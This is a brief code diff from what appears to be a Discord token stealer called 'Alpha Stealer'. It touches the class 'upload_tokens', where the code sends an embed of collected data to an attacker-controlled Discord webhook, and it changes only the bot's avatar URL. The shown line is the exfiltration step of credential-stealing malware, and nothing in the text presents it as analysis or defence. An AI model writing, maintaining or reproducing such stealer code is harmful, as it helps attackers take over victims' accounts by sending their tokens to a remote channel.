@@ -369,4 +369,4 @@ class upload_tokens:
 
              embed.set_footer(text='[YouTube Channel](https://www.youtube.com/@paradoxz4681)')
 
-            self.webhook.send(embed=embed, username="Alpha Stealer", avatar_url="https://images-ext-1.discordapp.net/external/pu5CNdNZ_teS81q1zOwLBLHH1QpwJcU_vLRun8iAK5s/%3Fsize%3D2048/https/cdn.discordapp.com/avatars/915995314790481982/a_63667cf6eb7a59c81dfaa939ac3b04ed.gif")
+            self.webhook.send(embed=embed, username="Alpha Stealer", avatar_url="https://media.discordapp.net/attachments/1071150917304471693/1071151692940316683/standard.gif")
